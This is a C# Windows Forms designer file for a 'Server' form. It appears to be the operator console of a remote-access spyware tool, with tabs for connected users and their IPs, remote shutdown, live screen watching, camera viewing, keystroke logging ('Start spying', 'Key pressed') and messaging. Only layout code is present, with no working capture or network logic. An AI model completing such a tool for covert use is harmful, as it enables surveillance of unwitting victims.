namespace Server
{
    partial class Ruler
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.Tabs = new System.Windows.Forms.TabControl();
            this.Home = new System.Windows.Forms.TabPage();
            this.Cancel = new System.Windows.Forms.Button();
            this.Shutdown = new System.Windows.Forms.Button();
            this.Connect = new System.Windows.Forms.Button();
            this.Connections = new System.Windows.Forms.ListView();
            this.Number = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.UserName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.IP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Control = new System.Windows.Forms.TabPage();
            this.Screen = new System.Windows.Forms.PictureBox();
            this.Full = new System.Windows.Forms.Button();
            this.Stop = new System.Windows.Forms.Button();
            this.Watch = new System.Windows.Forms.Button();
            this.Spy = new System.Windows.Forms.TabPage();
            this.Problem = new System.Windows.Forms.Label();
            this.Search = new System.Windows.Forms.Button();
            this.Word = new System.Windows.Forms.TextBox();
            this.StartS = new System.Windows.Forms.Button();
            this.Log = new System.Windows.Forms.Label();
            this.Message = new System.Windows.Forms.TabPage();
            this.Send = new System.Windows.Forms.Button();
            this.From = new System.Windows.Forms.TextBox();
            this.Msg = new System.Windows.Forms.TextBox();
            this.cameraa = new System.Windows.Forms.PictureBox();
            this.watchC = new System.Windows.Forms.Button();
            this.stopC = new System.Windows.Forms.Button();
            this.press = new System.Windows.Forms.RichTextBox();
            this.Tabs.SuspendLayout();
            this.Home.SuspendLayout();
            this.Control.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Screen)).BeginInit();
            this.Spy.SuspendLayout();
            this.Message.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.cameraa)).BeginInit();
            this.SuspendLayout();
            // 
            // Tabs
            // 
            this.Tabs.Controls.Add(this.Home);
            this.Tabs.Controls.Add(this.Control);
            this.Tabs.Controls.Add(this.Spy);
            this.Tabs.Controls.Add(this.Message);
            this.Tabs.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Tabs.Location = new System.Drawing.Point(0, 0);
            this.Tabs.Name = "Tabs";
            this.Tabs.SelectedIndex = 0;
            this.Tabs.Size = new System.Drawing.Size(796, 564);
            this.Tabs.TabIndex = 0;
            // 
            // Home
            // 
            this.Home.Controls.Add(this.Cancel);
            this.Home.Controls.Add(this.Shutdown);
            this.Home.Controls.Add(this.Connect);
            this.Home.Controls.Add(this.Connections);
            this.Home.Location = new System.Drawing.Point(4, 22);
            this.Home.Name = "Home";
            this.Home.Padding = new System.Windows.Forms.Padding(3);
            this.Home.Size = new System.Drawing.Size(788, 538);
            this.Home.TabIndex = 0;
            this.Home.Text = "Home";
            this.Home.UseVisualStyleBackColor = true;
            // 
            // Cancel
            // 
            this.Cancel.Location = new System.Drawing.Point(6, 297);
            this.Cancel.Name = "Cancel";
            this.Cancel.Size = new System.Drawing.Size(103, 23);
            this.Cancel.TabIndex = 4;
            this.Cancel.Text = "Cancel Shutdown";
            this.Cancel.UseVisualStyleBackColor = true;
            this.Cancel.Click += new System.EventHandler(this.Cancel_Click);
            // 
            // Shutdown
            // 
            this.Shutdown.Location = new System.Drawing.Point(6, 268);
            this.Shutdown.Name = "Shutdown";
            this.Shutdown.Size = new System.Drawing.Size(103, 23);
            this.Shutdown.TabIndex = 3;
            this.Shutdown.Text = "Shutdown";
            this.Shutdown.UseVisualStyleBackColor = true;
            this.Shutdown.Click += new System.EventHandler(this.Shutdown_Click);
            // 
            // Connect
            // 
            this.Connect.Location = new System.Drawing.Point(6, 242);
            this.Connect.Name = "Connect";
            this.Connect.Size = new System.Drawing.Size(103, 23);
            this.Connect.TabIndex = 2;
            this.Connect.Text = "Connect";
            this.Connect.UseVisualStyleBackColor = true;
            this.Connect.Click += new System.EventHandler(this.Connect_Click);
            // 
            // Connections
            // 
            this.Connections.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.Number,
            this.UserName,
            this.IP});
            this.Connections.GridLines = true;
            this.Connections.Location = new System.Drawing.Point(191, 35);
            this.Connections.Name = "Connections";
            this.Connections.Size = new System.Drawing.Size(297, 147);
            this.Connections.TabIndex = 1;
            this.Connections.UseCompatibleStateImageBehavior = false;
            this.Connections.View = System.Windows.Forms.View.Details;
            // 
            // Number
            // 
            this.Number.Text = "#";
            this.Number.Width = 47;
            // 
            // UserName
            // 
            this.UserName.Text = "User Name";
            this.UserName.Width = 75;
            // 
            // IP
            // 
            this.IP.Text = "IP";
            this.IP.Width = 165;
            // 
            // Control
            // 
            this.Control.Controls.Add(this.Screen);
            this.Control.Controls.Add(this.Full);
            this.Control.Controls.Add(this.Stop);
            this.Control.Controls.Add(this.Watch);
            this.Control.Location = new System.Drawing.Point(4, 22);
            this.Control.Name = "Control";
            this.Control.Padding = new System.Windows.Forms.Padding(3);
            this.Control.Size = new System.Drawing.Size(788, 538);
            this.Control.TabIndex = 1;
            this.Control.Text = "Control";
            this.Control.UseVisualStyleBackColor = true;
            // 
            // Screen
            // 
            this.Screen.Location = new System.Drawing.Point(0, 0);
            this.Screen.Name = "Screen";
            this.Screen.Size = new System.Drawing.Size(792, 486);
            this.Screen.TabIndex = 3;
            this.Screen.TabStop = false;
            // 
            // Full
            // 
            this.Full.Location = new System.Drawing.Point(170, 492);
            this.Full.Name = "Full";
            this.Full.Size = new System.Drawing.Size(75, 23);
            this.Full.TabIndex = 2;
            this.Full.Text = "Full Watch";
            this.Full.UseVisualStyleBackColor = true;
            this.Full.Click += new System.EventHandler(this.Full_Click);
            // 
            // Stop
            // 
            this.Stop.Location = new System.Drawing.Point(89, 492);
            this.Stop.Name = "Stop";
            this.Stop.Size = new System.Drawing.Size(75, 23);
            this.Stop.TabIndex = 1;
            this.Stop.Text = "Stop";
            this.Stop.UseVisualStyleBackColor = true;
            this.Stop.Click += new System.EventHandler(this.Stop_Click);
            // 
            // Watch
            // 
            this.Watch.Location = new System.Drawing.Point(8, 492);
            this.Watch.Name = "Watch";
            this.Watch.Size = new System.Drawing.Size(75, 23);
            this.Watch.TabIndex = 0;
            this.Watch.Text = "Watch";
            this.Watch.UseVisualStyleBackColor = true;
            this.Watch.Click += new System.EventHandler(this.Watch_Click);
            // 
            // Spy
            // 
            this.Spy.Controls.Add(this.press);
            this.Spy.Controls.Add(this.Problem);
            this.Spy.Controls.Add(this.Search);
            this.Spy.Controls.Add(this.Word);
            this.Spy.Controls.Add(this.StartS);
            this.Spy.Controls.Add(this.Log);
            this.Spy.Location = new System.Drawing.Point(4, 22);
            this.Spy.Name = "Spy";
            this.Spy.Padding = new System.Windows.Forms.Padding(3);
            this.Spy.Size = new System.Drawing.Size(788, 538);
            this.Spy.TabIndex = 3;
            this.Spy.Text = "Spy";
            this.Spy.UseVisualStyleBackColor = true;
            // 
            // Problem
            // 
            this.Problem.AutoSize = true;
            this.Problem.Location = new System.Drawing.Point(60, 227);
            this.Problem.Name = "Problem";
            this.Problem.Size = new System.Drawing.Size(13, 13);
            this.Problem.TabIndex = 11;
            this.Problem.Text = "--";
            // 
            // Search
            // 
            this.Search.Location = new System.Drawing.Point(144, 195);
            this.Search.Name = "Search";
            this.Search.Size = new System.Drawing.Size(75, 23);
            this.Search.TabIndex = 10;
            this.Search.Text = "Search";
            this.Search.UseVisualStyleBackColor = true;
            this.Search.Click += new System.EventHandler(this.Search_Click);
            // 
            // Word
            // 
            this.Word.Location = new System.Drawing.Point(8, 195);
            this.Word.Name = "Word";
            this.Word.Size = new System.Drawing.Size(130, 20);
            this.Word.TabIndex = 9;
            this.Word.Text = "Enter word to search";
            // 
            // StartS
            // 
            this.StartS.Location = new System.Drawing.Point(705, 7);
            this.StartS.Name = "StartS";
            this.StartS.Size = new System.Drawing.Size(75, 23);
            this.StartS.TabIndex = 6;
            this.StartS.Text = "Start spying";
            this.StartS.UseVisualStyleBackColor = true;
            this.StartS.Click += new System.EventHandler(this.StartS_Click);
            // 
            // Log
            // 
            this.Log.AutoSize = true;
            this.Log.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(177)));
            this.Log.Location = new System.Drawing.Point(3, 3);
            this.Log.Name = "Log";
            this.Log.Size = new System.Drawing.Size(132, 25);
            this.Log.TabIndex = 0;
            this.Log.Text = "Key pressed";
            // 
            // Message
            // 
            this.Message.Controls.Add(this.Send);
            this.Message.Controls.Add(this.From);
            this.Message.Controls.Add(this.Msg);
            this.Message.Location = new System.Drawing.Point(4, 22);
            this.Message.Name = "Message";
            this.Message.Padding = new System.Windows.Forms.Padding(3);
            this.Message.Size = new System.Drawing.Size(788, 538);
            this.Message.TabIndex = 4;
            this.Message.Text = "Message";
            this.Message.UseVisualStyleBackColor = true;
            // 
            // Send
            // 
            this.Send.Location = new System.Drawing.Point(345, 453);
            this.Send.Name = "Send";
            this.Send.Size = new System.Drawing.Size(75, 23);
            this.Send.TabIndex = 2;
            this.Send.Text = "Send";
            this.Send.UseVisualStyleBackColor = true;
            this.Send.Click += new System.EventHandler(this.Send_Click);
            // 
            // From
            // 
            this.From.Location = new System.Drawing.Point(3, 6);
            this.From.Name = "From";
            this.From.Size = new System.Drawing.Size(783, 20);
            this.From.TabIndex = 1;
            this.From.Text = "From:";
            // 
            // Msg
            // 
            this.Msg.Location = new System.Drawing.Point(3, 32);
            this.Msg.Multiline = true;
            this.Msg.Name = "Msg";
            this.Msg.Size = new System.Drawing.Size(783, 415);
            this.Msg.TabIndex = 0;
            this.Msg.Text = "Message:";
            // 
            // cameraa
            // 
            this.cameraa.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.cameraa.Location = new System.Drawing.Point(0, 0);
            this.cameraa.Name = "cameraa";
            this.cameraa.Size = new System.Drawing.Size(788, 399);
            this.cameraa.TabIndex = 0;
            this.cameraa.TabStop = false;
            // 
            // watchC
            // 
            this.watchC.Location = new System.Drawing.Point(40, 461);
            this.watchC.Name = "watchC";
            this.watchC.Size = new System.Drawing.Size(75, 23);
            this.watchC.TabIndex = 3;
            this.watchC.Text = "Watch";
            this.watchC.UseVisualStyleBackColor = true;
            // 
            // stopC
            // 
            this.stopC.Location = new System.Drawing.Point(624, 461);
            this.stopC.Name = "stopC";
            this.stopC.Size = new System.Drawing.Size(75, 23);
            this.stopC.TabIndex = 4;
            this.stopC.Text = "Stop";
            this.stopC.UseVisualStyleBackColor = true;
            // 
            // press
            // 
            this.press.Location = new System.Drawing.Point(8, 31);
            this.press.Name = "press";
            this.press.Size = new System.Drawing.Size(370, 147);
            this.press.TabIndex = 12;
            this.press.Text = "";
            // 
            // Ruler
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(796, 564);
            this.Controls.Add(this.Tabs);
            this.Name = "Ruler";
            this.Text = "Ruler";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.Tabs.ResumeLayout(false);
            this.Home.ResumeLayout(false);
            this.Control.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.Screen)).EndInit();
            this.Spy.ResumeLayout(false);
            this.Spy.PerformLayout();
            this.Message.ResumeLayout(false);
            this.Message.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.cameraa)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.TabControl Tabs;
        private System.Windows.Forms.TabPage Home;
        private System.Windows.Forms.TabPage Control;
        private System.Windows.Forms.TabPage Spy;
        private System.Windows.Forms.Button Cancel;
        private System.Windows.Forms.Button Shutdown;
        private System.Windows.Forms.Button Connect;
        private System.Windows.Forms.ListView Connections;
        private System.Windows.Forms.ColumnHeader Number;
        private System.Windows.Forms.ColumnHeader UserName;
        private System.Windows.Forms.ColumnHeader IP;
        private System.Windows.Forms.PictureBox Screen;
        private System.Windows.Forms.Button Full;
        private System.Windows.Forms.Button Stop;
        private System.Windows.Forms.Button Watch;
        private System.Windows.Forms.Button Send;
        private System.Windows.Forms.TextBox From;
        private System.Windows.Forms.TextBox Msg;
        private System.Windows.Forms.TabPage Message;
        private System.Windows.Forms.Label Log;
        private System.Windows.Forms.Button StartS;
        private System.Windows.Forms.Button Search;
        private System.Windows.Forms.TextBox Word;
        private System.Windows.Forms.Label Problem;
        private System.Windows.Forms.PictureBox cameraa;
        private System.Windows.Forms.Button watchC;
        private System.Windows.Forms.Button stopC;
        private System.Windows.Forms.RichTextBox press;
    }
}

